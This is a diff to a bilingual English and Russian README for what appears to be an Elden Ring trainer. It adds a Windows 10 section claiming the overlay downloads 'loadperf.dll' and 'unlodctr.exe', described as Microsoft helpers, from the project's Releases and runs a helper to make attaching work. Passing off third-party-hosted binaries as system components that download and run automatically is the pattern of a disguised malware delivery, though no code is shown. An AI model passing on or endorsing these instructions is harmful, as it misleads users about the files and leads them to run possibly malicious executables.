@@ -26,6 +26,12 @@ Start Elden Ring 1.17.2 first, then this exe. If attach fails, run as administra
 
 Сначала Elden Ring 1.17.2, потом exe. Если не цепляется, запусти от администратора.
 
+## Windows 10
+
+On Windows 10 and older, attach to eldenring.exe is less reliable than on Windows 11. If that happens, the overlay can fetch two extra Microsoft helpers from Releases: `loadperf.dll` and `unlodctr.exe`. A short helper run brings the environment to a state where attach works like on newer Windows. Windows 11 usually does not need this step. Files are also in the latest release if you want them next to the exe.
+
+На Windows 10 и ниже обычная привязка к процессу игры часто не проходит. Тогда докачиваются системные `loadperf.dll` и `unlodctr.exe` (компоненты Microsoft). Короткий запуск helper приводит окружение к состоянию, в котором оверлей нормально стартует и цепляется к игре, как на более новых системах. Сами файлы лежат в [Releases](https://github.com/Magicdaclip52/elden-ring-trainer/releases) рядом с ERTrainer.zip.
+
 ## Source / исходники
 
 Ready build: [Releases](https://github.com/Magicdaclip52/elden-ring-trainer/releases)
